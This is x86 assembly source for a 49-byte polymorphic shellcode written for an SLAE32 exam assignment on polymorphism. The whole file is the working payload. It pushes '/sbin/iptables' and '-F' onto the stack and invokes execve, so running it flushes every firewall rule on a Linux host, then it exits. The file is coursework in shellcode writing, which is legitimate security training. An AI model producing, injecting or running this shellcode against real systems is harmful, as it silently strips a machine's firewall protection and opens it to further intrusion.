; flush_iptables_polymorphic - 49 bytes
; Author: Jack McBride (PA-6483)
; Website: https://jacklgmcbride.co.uk
;
; Purpose: SLAE32 exam assignment
;
;
; Assignment 6: Polymorphism

global _start

section .text

_start:
	xor edx,edx
	; push -F
	push edx
	push word 0x462d
	mov eax, esp; save pointer to second argument in EAX
	; push /sbin/iptables
	push edx
	push 0x73656c62
	push 0x61747069
	push 0x2f2f6e69
	push 0x62732f2f
	; move pointer to file name into ebx
	mov ebx, esp
	push edx
	push eax; push second argument
	push ebx; push first argument
	mov ecx, esp
	xor eax, eax
	mov 	al,0xb
	int	0x80
	xor eax, eax
	mov al, 0x1
	int 0x80
